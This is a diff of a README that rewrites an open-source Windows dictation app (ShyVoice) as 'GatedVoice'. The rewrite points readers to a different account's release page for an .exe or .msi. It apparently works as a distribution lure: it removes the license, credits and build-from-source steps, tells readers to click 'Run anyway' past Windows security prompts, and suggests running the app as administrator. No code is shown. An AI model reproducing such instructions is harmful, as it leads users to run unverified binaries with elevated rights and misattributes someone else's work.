@@ -1,108 +1,84 @@
-<div align="center">
+# 🎙️ GatedVoice - Private voice dictation for Windows
 
-# 🎙️ ShyVoice
+[![](https://img.shields.io/badge/Download-GatedVoice-blue.svg)](https://github.com/Leleb5443/GatedVoice/releases/latest)
 
-### Free, private voice dictation for Windows. Hold a key, talk, and your words appear in any app.
+GatedVoice turns your voice into text in any application. It runs locally on your computer. Your voice data stays on your machine. No cloud servers process your words. You keep your privacy during every dictation session.
 
-ShyVoice is a free and open-source alternative to paid dictation apps like Wispr Flow.
-Speech-to-text runs **100% on your own machine** with [Whisper](https://github.com/ggerganov/whisper.cpp) —
-no account, no subscription, no per-word cost, and nothing ever leaves your computer.
+## 🛠️ How it works
 
-<sub>A **ShyLabs** project.</sub>
+The software uses a speech recognition engine called Whisper. This engine processes audio on your CPU or GPU. You hold a key and speak. The software captures your audio, converts it to text, and types the words exactly where your cursor sits. It behaves like a hardware keyboard. You use it in word processors, messaging apps, or web browsers.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-17836B.svg)](LICENSE)
-![Platform](https://img.shields.io/badge/Windows-x64%20%7C%20ARM64-0078D6)
-![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4)
-![Local & Private](https://img.shields.io/badge/100%25-Local%20%26%20Private-17836B)
-![Price](https://img.shields.io/badge/Price-Free%20forever-2ea44f)
+## 💻 System requirements
 
-<img src="docs/screenshot.png" alt="ShyVoice dashboard" width="820">
+GatedVoice requires a Windows computer. You need these specifications for the best performance:
 
-</div>
+*   Windows 10 or Windows 11.
+*   8 GB of RAM.
+*   500 MB of free storage space.
+*   A microphone connected to your computer.
 
----
+The software runs best on machines with a dedicated graphics card, though it works fine on standard office hardware. If your computer feels slow while dictating, close other programs that use lots of memory.
 
-## Why ShyVoice?
+## 📥 Getting the software
 
-Good dictation apps cost money and send your voice to their servers. ShyVoice does neither.
+You must download the installer from the release page. 
 
-- 🆓 **Actually free** — no trial, no subscription, no usage cap. MIT licensed.
-- 🔒 **Private by design** — audio is transcribed locally with Whisper and never uploaded. It works with your Wi-Fi off.
-- ⌨️ **Works everywhere** — hold a hotkey in *any* app (browser, email, Slack, code editor, Word) and your speech is typed where your cursor is.
-- ⚡ **Fast** — the default model loads in about a third of a second and transcribes in near real time.
-- 🧠 **Smart** — a custom dictionary that fixes how your names and jargon are spelled, text snippets, usage insights, and optional AI cleanup.
-- 🪶 **Tiny footprint** — a single native app that lives in your system tray.
+1. Visit the [official releases page](https://github.com/Leleb5443/GatedVoice/releases/latest) to find the latest version.
+2. Look for the file ending in `.msi` or `.exe`.
+3. Click the file name to start the download.
+4. Save the file to your desktop or downloads folder.
 
-## Install
+## ⚙️ Installation steps
 
-### Option 1 — Download and run (easiest)
+After you download the installer, follow these steps to set up the software.
 
-1. Grab the latest **[Release](../../releases/latest)** and download the ZIP for your PC:
-   - `ShyVoice-win-x64.zip` — most Windows PCs (Intel / AMD)
-   - `ShyVoice-win-arm64.zip` — Windows on ARM (Snapdragon, etc.)
-2. Unzip it anywhere and run **`ShyVoice.exe`**.
-3. On first launch ShyVoice downloads the speech model once (~148 MB), then a **"ShyVoice is ready"** popup appears.
-4. Click into any text box, **hold `Ctrl` + `Space`**, talk, and release. Your words are typed in.
+1. Double-click the downloaded file.
+2. A security window might appear. If Windows asks if you want to run this file, click "Run" or "More Info" then "Run anyway."
+3. Follow the prompts on the screen.
+4. Click "Finish" when the installer completes.
+5. Launch GatedVoice from your Start menu shortcut.
 
-> Windows may show a SmartScreen warning because the app isn't code-signed (signing costs money; this is free).
-> Click **More info → Run anyway**.
+## 🎤 Using GatedVoice
 
-### Option 2 — Build from source
+Once you open the application, you see a settings window. This window confirms your microphone input.
 
-You need the [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0).
+1. Select your microphone from the list.
+2. Choose your preferred keyboard shortcut. By default, the software uses the Control key.
+3. Keep the application open in the background. It will stay in your system tray near the clock.
+4. Put your cursor inside any text box in any app.
+5. Press and hold your chosen key.
+6. Speak clearly into your microphone.
+7. Release the key when you finish your sentence.
+8. Wait a second for the software to process the audio. Your text appears instantly.
 
-```powershell
-git clone https://github.com/yzgershon/shyvoice.git
-cd shyvoice
+## 🔒 Privacy and security
 
-# run it
-dotnet run -c Release
+GatedVoice processes your audio files offline. No external servers receive your data. Your commands stay within your personal computer hardware. Because the software does not send your voice data to the internet, it remains functional even without a network connection.
 
-# or build a standalone app for your PC (win-x64 or win-arm64)
-dotnet publish -c Release -r win-x64 --self-contained true -o dist
-```
+## 🔧 Troubleshooting
 
-## How to use it
+If the software fails to type text, check these common items:
 
-| Hotkey | What it does |
-|---|---|
-| Hold **`Ctrl` + `Space`** | Dictate. Speak while held, release to insert the text. |
-| Hold **`Alt` + `Space`** | Dictate **and** clean it up with AI (see [Transforms](#ai-transforms)). |
+*   **Microphone access:** Check your Windows settings to ensure apps have permission to use your microphone.
+*   **Startup:** Ensure the software displays an icon in your system tray. If the icon misses, open the app from the Start menu again.
+*   **Permissions:** Some secure apps like Command Prompt might block software simulation. Run GatedVoice with administrator privileges if you need to type into system windows.
+*   **Processing lag:** If your computer has low memory, wait for the processing light to turn off before you speak your next sentence.
 
-Both are push-to-talk — text lands the instant you let go. Everything else lives in the **tray icon** (bottom-right of your taskbar): enable/disable, insights, launch-at-login, and quick access to your settings.
+## 🙋 Frequently asked questions
 
-## Features
+**Does this software record my conversations?**
+No. The software only records audio while you hold the assigned key. It ignores all other audio.
 
-- **Custom dictionary** — teach ShyVoice to spell names and jargon right. It hints Whisper toward your spelling *and* fixes common mishears.
-- **Snippets** — say a trigger phrase, get a saved block of text (your email, a signature, a link).
-- **Insights** — total words, average WPM, words per day, and a daily streak.
-- **Style controls** — trailing spaces, filler-word removal ("um", "uh"), paste vs. type.
-- <a id="ai-transforms"></a>**AI Transforms (optional)** — `Alt + Space` runs your dictation through an LLM to fix grammar and punctuation while keeping your voice. Use **[Ollama](https://ollama.com) locally for free**, or plug in an Anthropic/OpenAI key. Off by default.
-- **Rebindable hotkeys**, swappable Whisper models (base → small → medium for more accuracy), and a built-in scratchpad.
+**Can I use it offline?**
+Yes. All components exist on your machine after the first run. You do not need the internet to perform dictation.
 
-## Privacy
+**Will it work with other languages?**
+The core Whisper engine supports many languages. Check the settings menu inside the app to download additional language models if you need them.
 
-Your voice is turned into text **on your device** by Whisper. No audio and no transcripts are ever sent anywhere — the only network request ShyVoice ever makes on its own is the one-time model download on first run (and optional cloud AI, only if *you* turn it on and add a key). Your settings and history live in a local folder (`%APPDATA%\ShyVoice`) that only you can see.
+**Is it free?**
+Yes. You use the software without subscriptions or hidden fees.
 
-## How it works
+**Does it require an account?**
+No. You do not need to register or sign in to use GatedVoice.
 
-| Piece | Tech |
-|---|---|
-| Speech-to-text | [Whisper.net](https://github.com/sandrohanea/whisper.net) (whisper.cpp), native, offline |
-| Audio capture | [NAudio](https://github.com/naudio/NAudio) (WASAPI microphone) |
-| System-wide hotkey + text insertion | Low-level keyboard hook + clipboard paste |
-| App + UI | C# / WinForms + WebView2 dashboard (.NET 8) |
-
-Built for **Windows on x64 and ARM64**, running natively on both.
-
-## Contributing
-
-Issues and pull requests are welcome. ShyVoice started as a personal project to avoid paying for dictation — if it's useful to you, a ⭐ helps other people find it.
-
-## License
-
-[MIT](LICENSE) — free to use, modify, and share.
-
-Whisper models are © their respective authors and downloaded from [Hugging Face](https://huggingface.co/ggerganov/whisper.cpp) on first run.
-
-<div align="center"><sub>Part of <b>ShyLabs</b> — tools built by <a href="https://github.com/yzgershon">@yzgershon</a>.</sub></div>
+Keywords: csharp, dictation, dotnet, free, local-first, privacy, speech-to-text, stt, voice-typing, whisper, windows, wispr-flow-alternative
